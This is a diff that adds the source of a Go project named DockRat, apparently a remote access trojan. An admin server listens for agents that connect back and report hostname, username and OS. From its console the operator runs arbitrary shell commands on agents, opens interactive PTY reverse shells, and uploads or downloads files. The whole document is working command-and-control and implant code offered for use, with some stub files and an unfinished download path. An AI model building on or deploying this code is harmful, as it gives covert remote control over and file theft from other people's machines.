@@ -1,0 +1,950 @@
+子文件夹：./cmd
+子文件夹：./cmd/admin
+文件：./cmd/admin/main.go
+内容：
+
+
+package main
+
+import (
+	"log"
+
+	"github.com/Singert/DockRat/core/network"
+	"github.com/Singert/DockRat/core/protocol"
+	"github.com/Singert/DockRat/core/node"
+)
+
+var registry = node.NewRegistry()
+
+func main() {
+	log.Println("[+] Admin starting...")
+
+	// 启动控制台命令处理
+	go protocol.StartConsole(registry)
+
+	// 启动监听并处理 Agent 连接
+	network.StartListener(":9999", registry)
+}
+
+
+/*
+响应消息（如 MsgResponse）缓存起来，以便在控制台中输出最近一条响应？
+你也可以将 MsgShell 输出定向到带颜色或带提示的终端 UI，后续支持退出、上传等命令扩展。
+如需进一步支持 shell 会话保持、窗口调整、或 stdout 缓存，
+*/
+
+子文件夹：./cmd/agent
+文件：./cmd/agent/main.go
+内容：
+
+
+package main
+
+import (
+	"encoding/json"
+	"log"
+	"net"
+	"os"
+	"runtime"
+
+	"github.com/Singert/DockRat/core/protocol"
+	"github.com/Singert/DockRat/core/network"
+)
+
+type HandshakePayload struct {
+	Hostname string `json:"hostname"`
+	Username string `json:"username"`
+	OS       string `json:"os"` 
+}
+
+func main() {
+	adminAddr := "127.0.0.1:9999"
+	conn, err := net.Dial("tcp", adminAddr)
+	if err != nil {
+		log.Fatalf("[-] Failed to connect to admin: %v", err)
+	}
+	log.Println("[+] Connected to admin!")
+
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME")
+	}
+
+	payload := HandshakePayload{
+		Hostname: hostname,
+		Username: username,
+		OS:       runtime.GOOS,
+	}
+	payloadBytes, _ := json.Marshal(payload)
+
+	msg := protocol.Message{
+		Type:    protocol.MsgHandshake,
+		Payload: payloadBytes,
+	}
+
+	data, err := protocol.EncodeMessage(msg)
+	if err != nil {
+		log.Fatalf("[-] Failed to encode message: %v", err)
+	}
+
+	_, err = conn.Write(data)
+	if err != nil {
+		log.Fatalf("[-] Failed to send message: %v", err)
+	}
+
+	log.Println("[+] Handshake message sent")
+
+	network.StartAgent(conn)
+}
+
+
+
+子文件夹：./core
+子文件夹：./core/common
+文件：./core/common/config.go
+内容：
+package common
+文件：./core/common/logger.go
+内容：
+package common
+
+子文件夹：./core/crypto
+文件：./core/crypto/cipher.go
+内容：
+package crypto
+子文件夹：./core/network
+文件：./core/network/connection.go
+内容：
+package network
+
+import (
+	"encoding/json"
+	"fmt"
+	"io"
+	"log"
+	"net"
+
+	"github.com/Singert/DockRat/core/node"
+	"github.com/Singert/DockRat/core/protocol"
+	"github.com/Singert/DockRat/core/utils"
+)
+
+type HandshakePayload struct {
+	Hostname string `json:"hostname"`
+	Username string `json:"username"`
+	OS       string `json:"os"`
+}
+
+func StartListener(addr string, registry *node.Registry) {
+	ln, err := net.Listen("tcp", addr)
+	if err != nil {
+		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
+	}
+	log.Printf("[+] Listening on %s", addr)
+
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			log.Println("[!] Accept error:", err)
+			continue
+		}
+		go handleConnection(conn, registry)
+	}
+}
+
+func handleConnection(conn net.Conn, registry *node.Registry) {
+	log.Printf("[+] New connection from %s", conn.RemoteAddr())
+
+	lengthBuf := make([]byte, 4)
+	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+		log.Println("[!] Failed to read message length:", err)
+		conn.Close()
+		return
+	}
+	length := utils.BytesToUint32(lengthBuf)
+	data := make([]byte, length)
+	if _, err := io.ReadFull(conn, data); err != nil {
+		log.Println("[!] Failed to read message body:", err)
+		conn.Close()
+		return
+	}
+
+	msg, err := protocol.DecodeMessage(data)
+	if err != nil {
+		log.Println("[!] Failed to decode message:", err)
+		conn.Close()
+		return
+	}
+
+	if msg.Type == protocol.MsgHandshake {
+		var payload HandshakePayload
+		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+			log.Println("[!] Failed to decode handshake payload:", err)
+			conn.Close()
+			return
+		}
+
+		n := &node.Node{
+			Conn:     conn,
+			Hostname: payload.Hostname,
+			Username: payload.Username,
+			OS:       payload.OS,
+			Addr:     conn.RemoteAddr().String(),
+		}
+		id := registry.Add(n)
+		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)
+
+		go handleAgentMessages(n, registry)
+	} else {
+		log.Println("[!] Unknown message type:", msg.Type)
+		conn.Close()
+	}
+}
+
+func handleAgentMessages(n *node.Node, registry *node.Registry) {
+	conn := n.Conn
+	for {
+		lengthBuf := make([]byte, 4)
+		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
+			registry.Remove(n.ID)
+			conn.Close()
+			return
+		}
+		length := utils.BytesToUint32(lengthBuf)
+		data := make([]byte, length)
+		if _, err := io.ReadFull(conn, data); err != nil {
+			log.Printf("[-] Node %d read failed: %v", n.ID, err)
+			registry.Remove(n.ID)
+			conn.Close()
+			return
+		}
+
+		msg, err := protocol.DecodeMessage(data)
+		if err != nil {
+			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
+			continue
+		}
+
+		switch msg.Type {
+		case protocol.MsgResponse:
+			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
+		case protocol.MsgShell:
+			fmt.Print(string(msg.Payload))
+		default:
+			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
+		}
+	}
+}
+
+文件：./core/network/dispatcher.go
+内容：
+package network
+
+import (
+	"encoding/json"
+	"io"
+	"log"
+	"net"
+	"os"
+	"os/exec"
+
+	"strings"
+
+	"github.com/Singert/DockRat/core/protocol"
+	"github.com/Singert/DockRat/core/utils"
+	"github.com/creack/pty"
+)
+
+var shellStarted = false
+var shellStdin io.WriteCloser
+
+var currentUploadFile *os.File
+
+func StartAgent(conn net.Conn) {
+	for {
+		lengthBuf := make([]byte, 4)
+		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+			log.Printf("[-] Connection closed or failed: %v", err)
+			return
+		}
+		length := utils.BytesToUint32(lengthBuf)
+		data := make([]byte, length)
+		if _, err := io.ReadFull(conn, data); err != nil {
+			log.Printf("[-] Failed to read message body: %v", err)
+			return
+		}
+
+		msg, err := protocol.DecodeMessage(data)
+		if err != nil {
+			log.Printf("[-] Decode error: %v", err)
+			continue
+		}
+
+		switch msg.Type {
+		case protocol.MsgCommand:
+			handleCommand(msg, conn)
+		case protocol.MsgShell:
+			handleShellPTY(msg, conn)
+		case protocol.MsgUploadInit:
+			handleUploadInit(msg)
+		case protocol.MsgUploadChunk:
+			handleUploadChunk(msg)
+		case protocol.MsgUploadDone:
+			handleUploadDone()
+		case protocol.MsgDownloadInit:
+			handleDownloadInit(msg, conn)
+		default:
+			log.Println("[-] Unknown message type:", msg.Type)
+		}
+	}
+}
+
+func handleCommand(msg protocol.Message, conn net.Conn) {
+	var payload map[string]string
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] Command unmarshal error:", err)
+		return
+	}
+	cmdStr := payload["cmd"]
+	log.Println("[+] Received command:", cmdStr)
+
+	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
+	if err != nil {
+		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
+	}
+
+	resp := protocol.Message{
+		Type:    protocol.MsgResponse,
+		Payload: output,
+	}
+	data, _ := protocol.EncodeMessage(resp)
+	conn.Write(data)
+}
+
+func handleShellPTY(msg protocol.Message, conn net.Conn) {
+	line := string(msg.Payload)
+
+	if !shellStarted {
+		cmd := exec.Command("/bin/sh")
+		ptmx, err := pty.Start(cmd)
+		if err != nil {
+			log.Println("[-] Failed to start pty:", err)
+			return
+		}
+		shellStarted = true
+		shellStdin = ptmx
+
+		go func() {
+			buf := make([]byte, 1024)
+			for {
+				n, err := ptmx.Read(buf)
+				if err != nil {
+					log.Println("[-] Shell read error:", err)
+					return
+				}
+				msg := protocol.Message{
+					Type:    protocol.MsgShell,
+					Payload: buf[:n],
+				}
+				data, err := protocol.EncodeMessage(msg)
+				if err != nil {
+					log.Println("[-] Shell encode error:", err)
+					return
+				}
+				_, err = conn.Write(data)
+				if err != nil {
+					log.Println("[-] Shell write error:", err)
+					return
+				}
+			}
+		}()
+		return
+	}
+
+	// 已启动 shell，则写入 stdin
+	if !strings.HasSuffix(line, "\n") {
+		line += "\n"
+	}
+	_, err := shellStdin.Write([]byte(line))
+	if err != nil {
+		log.Println("[-] Write to shell error:", err)
+	}
+}
+
+func handleUploadInit(msg protocol.Message) {
+	var payload protocol.UploadInitPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] UploadInit decode error:", err)
+		return
+	}
+
+	file, err := os.Create(payload.Filename)
+	if err != nil {
+		log.Println("[-] Failed to create upload file:", err)
+		return
+	}
+
+	currentUploadFile = file
+	log.Printf("[+] Start receiving file: %s (%d bytes)", payload.Filename, payload.Filesize)
+}
+
+func handleUploadChunk(msg protocol.Message) {
+	if currentUploadFile == nil {
+		log.Println("[-] Received chunk with no open file")
+		return
+	}
+
+	var chunk protocol.UploadChunkPayload
+	if err := json.Unmarshal(msg.Payload, &chunk); err != nil {
+		log.Println("[-] Upload chunk decode error:", err)
+		return
+	}
+	_, err := currentUploadFile.Write(chunk.Data)
+	if err != nil {
+		log.Println("[-] Write chunk failed:", err)
+	}
+}
+
+func handleUploadDone() {
+	if currentUploadFile != nil {
+		currentUploadFile.Close()
+		currentUploadFile = nil
+		log.Println("[+] Upload complete")
+	} else {
+		log.Println("[-] Upload done received with no open file")
+	}
+}
+
+func handleDownloadInit(msg protocol.Message, conn net.Conn) {
+	var payload protocol.DownloadInitPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] DownloadInit decode error:", err)
+		return
+	}
+
+	file, err := os.Open(payload.Filename)
+	if err != nil {
+		log.Println("[-] Cannot open file for download:", err)
+		return
+	}
+	defer file.Close()
+
+	buf := make([]byte, 4096)
+	for {
+		n, err := file.Read(buf)
+		if n > 0 {
+			chunk := protocol.DownloadChunkPayload{Data: buf[:n]}
+			data, _ := json.Marshal(chunk)
+			msg := protocol.Message{Type: protocol.MsgDownloadChunk, Payload: data}
+			packet, _ := protocol.EncodeMessage(msg)
+			conn.Write(packet)
+		}
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			log.Println("[-] File read error:", err)
+			return
+		}
+	}
+	done := protocol.Message{Type: protocol.MsgDownloadDone, Payload: []byte("done")}
+	pkt, _ := protocol.EncodeMessage(done)
+	conn.Write(pkt)
+	log.Println("[+] File download finished")
+}
+
+文件：./core/network/packet.go
+内容：
+package network
+子文件夹：./core/node
+文件：./core/node/registry.go
+内容：
+package node
+
+import (
+	"fmt"
+	"net"
+	"sync"
+)
+
+type Node struct {
+	ID       int
+	Conn     net.Conn
+	Hostname string
+	Username string
+	OS       string
+	Addr     string
+}
+
+type Registry struct {
+	nodes  map[int]*Node
+	mu     sync.Mutex
+	nextID int
+}
+
+func NewRegistry() *Registry {
+	return &Registry{
+		nodes: make(map[int]*Node),
+	}
+}
+
+func (r *Registry) Add(node *Node) int {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	id := r.nextID
+	node.ID = id
+	r.nodes[id] = node
+	r.nextID++
+	return id
+}
+
+func (r *Registry) List() []*Node {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	nodes := make([]*Node, 0, len(r.nodes))
+	for _, node := range r.nodes {
+		nodes = append(nodes, node)
+	}
+	return nodes
+}
+
+func (r *Registry) Get(id int) (*Node, bool) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	node, ok := r.nodes[id]
+	return node, ok
+}
+
+func (r *Registry) Remove(id int) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	delete(r.nodes, id)
+}
+
+func (n *Node) String() string {
+	return fmt.Sprintf("Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s",
+		n.ID, n.Addr, n.Hostname, n.Username, n.OS)
+}
+
+
+文件：./core/node/topology.go
+内容：
+package node
+子文件夹：./core/protocol
+文件：./core/protocol/command.go
+内容：
+package protocol
+
+import (
+	"bufio"
+	"encoding/json"
+	"fmt"
+	"io"
+	"os"
+	"strings"
+
+	"github.com/Singert/DockRat/core/node"
+	"github.com/Singert/DockRat/core/utils"
+)
+
+var downloadChan = make(chan []byte, 100)
+
+func StartConsole(registry *node.Registry) {
+	scanner := bufio.NewScanner(os.Stdin)
+	for {
+		fmt.Print("(admin) >> ")
+		if !scanner.Scan() {
+			break
+		}
+		input := strings.TrimSpace(scanner.Text())
+		if input == "" {
+			continue
+		}
+
+		tokens := strings.SplitN(input, " ", 2)
+		cmd := tokens[0]
+		arg := ""
+		if len(tokens) > 1 {
+			arg = tokens[1]
+		}
+
+		switch cmd {
+		case "detail":
+			handleDetail(registry)
+		case "exec":
+			handleExec(arg, registry)
+		case "shell":
+			handleShell(arg, registry)
+		case "upload":
+			handleUpload(arg, registry)
+		case "download":
+			handleDownload(arg, registry)
+		default:
+			fmt.Println("[-] Unknown command")
+		}
+	}
+}
+
+func handleDetail(reg *node.Registry) {
+	nodes := reg.List()
+	fmt.Println("[+] Connected nodes:")
+	for _, n := range nodes {
+		fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s\n",
+			n.ID, n.Addr, n.Hostname, n.Username, n.OS)
+	}
+}
+
+func handleExec(arg string, reg *node.Registry) {
+	parts := strings.SplitN(arg, " ", 2)
+	if len(parts) != 2 {
+		fmt.Println("[-] Usage: exec <node_id> <command>")
+		return
+	}
+	id := parts[0]
+	cmdStr := parts[1]
+	var nid int
+	fmt.Sscanf(id, "%d", &nid)
+	n, ok := reg.Get(nid)
+	if !ok {
+		fmt.Println("[-] No such node")
+		return
+	}
+	cmdPayload := map[string]string{"cmd": cmdStr}
+	data, _ := json.Marshal(cmdPayload)
+	msg := Message{
+		Type:    MsgCommand,
+		Payload: data,
+	}
+	buf, err := EncodeMessage(msg)
+	if err != nil {
+		fmt.Println("[-] Encode failed:", err)
+		return
+	}
+	_, err = n.Conn.Write(buf)
+	if err != nil {
+		fmt.Println("[-] Send failed:", err)
+		return
+	}
+}
+
+func handleShell(arg string, reg *node.Registry) {
+	var nid int
+	fmt.Sscanf(arg, "%d", &nid)
+	n, ok := reg.Get(nid)
+	if !ok {
+		fmt.Println("[-] No such node")
+		return
+	}
+	msg := Message{
+		Type:    MsgShell,
+		Payload: []byte("start shell"),
+	}
+	buf, err := EncodeMessage(msg)
+	if err != nil {
+		fmt.Println("[-] Encode failed:", err)
+		return
+	}
+	_, err = n.Conn.Write(buf)
+	if err != nil {
+		fmt.Println("[-] Send failed:", err)
+		return
+	}
+	fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
+	inputScanner := bufio.NewScanner(os.Stdin)
+	for {
+		fmt.Print("remote$ ")
+		if !inputScanner.Scan() {
+			break
+		}
+		line := inputScanner.Text()
+		if strings.TrimSpace(line) == "exit" {
+			fmt.Println("[*] Exiting shell mode.")
+			break
+		}
+		cmdMsg := Message{
+			Type:    MsgShell,
+			Payload: []byte(line + "\n"),
+		}
+		buf, err := EncodeMessage(cmdMsg)
+		if err != nil {
+			fmt.Println("[-] Shell encode error:", err)
+			break
+		}
+		_, err = n.Conn.Write(buf)
+		if err != nil {
+			fmt.Println("[-] Shell write error:", err)
+			break
+		}
+	}
+}
+
+func readShellOutput(conn io.Reader) {
+	for {
+		lengthBuf := make([]byte, 4)
+		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+			fmt.Println("[-] Shell read error:", err)
+			return
+		}
+		length := utils.BytesToUint32(lengthBuf)
+		data := make([]byte, length)
+		if _, err := io.ReadFull(conn, data); err != nil {
+			fmt.Println("[-] Shell read body error:", err)
+			return
+		}
+		msg, err := DecodeMessage(data)
+		if err != nil {
+			fmt.Println("[-] Shell decode error:", err)
+			return
+		}
+		if msg.Type == MsgShell {
+			fmt.Printf(string(msg.Payload))
+		}
+	}
+}
+
+func handleUpload(arg string, registry *node.Registry) {
+	parts := strings.SplitN(arg, " ", 3)
+	if len(parts) != 3 {
+		fmt.Println("[-] Usage: upload <node_id> <local_file> <remote_file>")
+		return
+	}
+	var nid int
+	fmt.Sscanf(parts[0], "%d", &nid)
+	n, ok := registry.Get(nid)
+	if !ok {
+		fmt.Println("[-] No such node")
+		return
+	}
+	file, err := os.Open(parts[1])
+	if err != nil {
+		fmt.Println("[-] Failed to open file:", err)
+		return
+	}
+	defer file.Close()
+	fileInfo, err := file.Stat()
+	if err != nil {
+		fmt.Println("[-] Failed to get file info:", err)
+		return
+	}
+	initPayload := UploadInitPayload{
+		Filename: parts[2],
+		Filesize: fileInfo.Size(),
+	}
+	payloadBytes, err := json.Marshal(initPayload)
+	if err != nil {
+		fmt.Println("[-] Failed to marshal init payload:", err)
+		return
+	}
+	msg := Message{
+		Type:    MsgUploadInit,
+		Payload: payloadBytes,
+	}
+	buf, err := EncodeMessage(msg)
+	if err != nil {
+		fmt.Println("[-] Message encode failed:", err)
+		return
+	}
+	n.Conn.Write(buf)
+
+	reader := bufio.NewReader(file)
+	chunkSize := 4096
+	bufData := make([]byte, chunkSize)
+	for {
+		nr, err := reader.Read(bufData)
+		if nr > 0 {
+			chunk := UploadChunkPayload{
+				Data: bufData[:nr]}
+			data, _ := json.Marshal(chunk)
+			msg := Message{
+				Type:    MsgUploadChunk,
+				Payload: data,
+			}
+			pkt, _ := EncodeMessage(msg)
+			n.Conn.Write(pkt)
+		}
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			fmt.Println("Upload read error:", err)
+			return
+		}
+	}
+	done := Message{
+		Type:    MsgUploadDone,
+		Payload: []byte("done")}
+	pkt, _ := EncodeMessage(done)
+	n.Conn.Write(pkt)
+	fmt.Println("[+] Upload completed")
+}
+
+func handleDownload(arg string, registry *node.Registry) {
+	parts := strings.SplitN(arg, " ", 3)
+	if len(parts) != 3 {
+		fmt.Println("[-] Usage: download <node_id> <remote_file> <local_file>")
+		return
+	}
+	var nid int
+	fmt.Sscanf(parts[0], "%d", &nid)
+	n, ok := registry.Get(nid)
+	if !ok {
+		fmt.Println("[-] No such node")
+		return
+	}
+	req := DownloadInitPayload{Filename: parts[1]}
+	data, _ := json.Marshal(req)
+	msg := Message{Type: MsgDownloadInit, Payload: data}
+	buf, _ := EncodeMessage(msg)
+	n.Conn.Write(buf)
+
+	out, err := os.Create(parts[2])
+	if err != nil {
+		fmt.Println("[-] Create file error:", err)
+		return
+	}
+	defer out.Close()
+
+	for chunk := range downloadChan {
+		var payload DownloadChunkPayload
+		json.Unmarshal(chunk, &payload)
+		out.Write(payload.Data)
+	}
+	fmt.Println("[+] Download complete")
+}
+
+文件：./core/protocol/file_transfer.go
+内容：
+package protocol
+
+const (
+	MsgUploadInit  MessageType = "upload_init"  // 初始化上传请求（含文件名和长度）
+	MsgUploadChunk MessageType = "upload_chunk" // 上传数据块
+	MsgUploadDone  MessageType = "upload_done"  // 上传完成通知
+
+	MsgDownloadInit  MessageType = "download_init"  // 请求下载文件
+	MsgDownloadChunk MessageType = "download_chunk" // 下载数据块
+	MsgDownloadDone  MessageType = "download_done"  // 下载完成通知
+)
+
+type UploadInitPayload struct {
+	Filename string `json:"filename"`
+	Filesize int64  `json:"filesize"`
+}
+
+type UploadChunkPayload struct {
+	Data []byte `json:"data"`
+}
+
+type DownloadInitPayload struct {
+	Filename string `json:"filename"`
+}
+
+type DownloadChunkPayload struct {
+	Data []byte `json:"data"`
+}
+
+文件：./core/protocol/message.go
+内容：
+package protocol
+
+import (
+	"bytes"
+	"encoding/binary"
+	"encoding/json"
+	"fmt"
+)
+
+// MessageType 定义了消息类型，如 handshake、shell、upload 等
+type MessageType string
+
+const (
+	MsgHandshake MessageType = "handshake"
+	MsgHeartbeat MessageType = "heartbeat"
+	MsgCommand   MessageType = "command"
+	MsgResponse  MessageType = "response"
+	MsgShell     MessageType = "shell"
+)
+
+// Message 是基本通信结构
+// 结构体经过 JSON 编码后再加上长度前缀发送
+type Message struct {
+	Type    MessageType // such as handshake,shell,upload
+	Payload []byte      // the data to be sent, such as command or file content
+}
+
+// EncodeMessage 将Message编码带长度前缀的字节流
+func EncodeMessage(msg Message) ([]byte, error) {
+	data, err := json.Marshal(msg)
+	if err != nil {
+		return nil, err
+	}
+	buf := new(bytes.Buffer)
+	// 写入长度前缀(大端字节序)
+	err = binary.Write(buf, binary.BigEndian, uint32(len(data)))
+	if err != nil {
+		return nil, err
+	}
+	// 写入消息内容
+	_, err = buf.Write(data)
+	if err != nil {
+		return nil, err
+	}
+	return buf.Bytes(), nil
+}
+
+// DecodeMessage 从带长度前缀的字节流解码为Message
+func DecodeMessage(data []byte) (Message, error) {
+	var msg Message
+	if err := json.Unmarshal(data, &msg); err != nil {
+		return msg, fmt.Errorf("decode json: %w", err)
+	}
+	return msg, nil
+}
+
+// ReadMessage 从连接中读取一个完整的消息帧（包括长度前缀和内容）
+func ReadMessage(reader *bytes.Reader) (Message, error) {
+	var length uint32
+	if err := binary.Read(reader, binary.BigEndian, &length); err != nil {
+		return Message{}, fmt.Errorf("read length: %w", err)
+	}
+	msgData := make([]byte, length)
+	if _, err := reader.Read(msgData); err != nil {
+		return Message{}, fmt.Errorf("read payload: %w", err)
+	}
+	return DecodeMessage(msgData)
+
+}
+
+子文件夹：./core/utils
+文件：./core/utils/utils.go
+内容：
+package utils
+
+func BytesToUint32(b []byte) uint32 {
+	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
+}
+
+
+
+子文件夹：./download
+文件：./download/a.md
+内容：
+
+文件：./go.mod
+内容：
+module github.com/Singert/DockRat
+
+go 1.23.2
+
+require github.com/creack/pty v1.1.24
+
+文件：./go.sum
+内容：
+github.com/creack/pty v1.1.24 h1:bJrF4RRfyJnbTJqzRLHzcGaZK1NeM5kTC9jGgovnR1s=
+github.com/creack/pty v1.1.24/go.mod h1:08sCNb52WyoAwi2QDyzUCTgcvVFhUzewun7wtTfvcwE=
+
+
